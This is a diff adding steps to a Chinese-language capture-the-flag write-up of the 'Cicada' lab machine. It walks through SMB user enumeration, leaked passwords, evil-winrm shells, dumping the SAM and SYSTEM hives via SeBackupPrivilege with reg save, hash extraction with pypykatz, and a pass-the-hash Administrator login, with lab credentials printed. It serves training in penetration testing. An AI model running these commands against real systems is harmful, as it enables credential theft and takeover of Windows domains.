@@ -1,3 +1,7 @@
+---
+description: AD枚举 / SeBackupPrivilege /
+---
+
 # ✔️ Cicada
 
 ## 建立立足点
@@ -77,47 +81,106 @@ nxc smb 10.129.5.101 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
 <figure><img src="../../.gitbook/assets/13.png" alt=""><figcaption></figcaption></figure>
 
 * 已获取到了一个有效凭证：<mark style="color:red;">**michael.wrightson :Cicada$M6Corpb\*@Lp#nZp!8**</mark>
-*
+* 通过用户michael查询目标系统上更多的用户信息，找到了用户david的密码：
 
 ```bash
-// Some code
+nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
 ```
 
+<figure><img src="../../.gitbook/assets/9 (29).png" alt=""><figcaption></figcaption></figure>
 
+* 此时又得到了一个新的有效凭证：`david.orelious ：aRt$Lp#7t*VQ!3`，利用该凭证登录share共享目录：
 
+```bash
+smbclient -L //10.10.11.35 -U 'david.orelious'
+```
 
+<figure><img src="../../.gitbook/assets/10 (31).png" alt=""><figcaption></figcaption></figure>
 
+* 依次枚举各个目录，在\DEV目录中发现一个powershell脚本文件：**Backup\_script.ps1**
 
+```bash
+smbclient \\\\10.10.11.35\\DEV -U 'david.orelious'
+```
+
+<figure><img src="../../.gitbook/assets/11 (28).png" alt=""><figcaption></figcaption></figure>
+
+* 阅读该脚本发现另一个新的有效凭证：`emily.oscars ：Q!3@Lp#M6b*7t*Vt`
+
+<figure><img src="../../.gitbook/assets/12 (27).png" alt=""><figcaption></figcaption></figure>
+
+* 利用emily这个凭证使用evil-winrm进行登录，get shell：
+
+```bash
+evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+```
+
+<figure><img src="../../.gitbook/assets/13 (28).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
 ### 本地信息收集
 
+* 上传winPEAS进行信息收集：
 
+upload winPEASx64.exe
 
+<figure><img src="../../.gitbook/assets/14 (25).png" alt=""><figcaption></figcaption></figure>
 
+* 同时可以简单的手动枚举一下，比如当前账户的权限有哪些：
 
+```bash
+whoami /priv
+```
 
+<figure><img src="../../.gitbook/assets/15 (24).png" alt=""><figcaption></figcaption></figure>
+
+* 发现当前账户有备份操作的权限，这意味着可以利用该特权下载sam.hive文件和system.hive文件，从中提取Administrator的密码哈希，再利用它进行登录
 
 ### 漏洞利用
 
+* 创建一个temp目录：
 
+```bash
+mkdir C:\temp
+```
 
+<figure><img src="../../.gitbook/assets/16 (23).png" alt=""><figcaption></figcaption></figure>
 
+* 将目标系统的sam文件和system文件存到当前的temp目录中：
 
+```bash
+reg save hklm\sam C:\temp\sam.hive
+reg save hklm\system C:\temp\system.hive
+```
 
+<figure><img src="../../.gitbook/assets/17 (21).png" alt=""><figcaption></figcaption></figure>
 
-
+* 将这两个文件下载到Kali本地
 
 ### ROOT
 
+* 使用这两个文件提取凭证：
 
+```bash
+pypykatz registry -sam sam.hive system.hive -o secrets.txt
+```
 
+<figure><img src="../../.gitbook/assets/18 (20).png" alt=""><figcaption></figcaption></figure>
 
+* 获得Administrator的密码哈希：
 
+<figure><img src="../../.gitbook/assets/19 (20).png" alt=""><figcaption></figcaption></figure>
 
+* 利于获取到的哈希进行登录，获得admin权限的shell：
 
+```bash
+evil-winrm -i 10.10.11.35 -u Administrator -H '87e7c93a3e8a0ea4a581937016f341'
+```
 
+<figure><img src="../../.gitbook/assets/20 (17).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/21 (15).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 
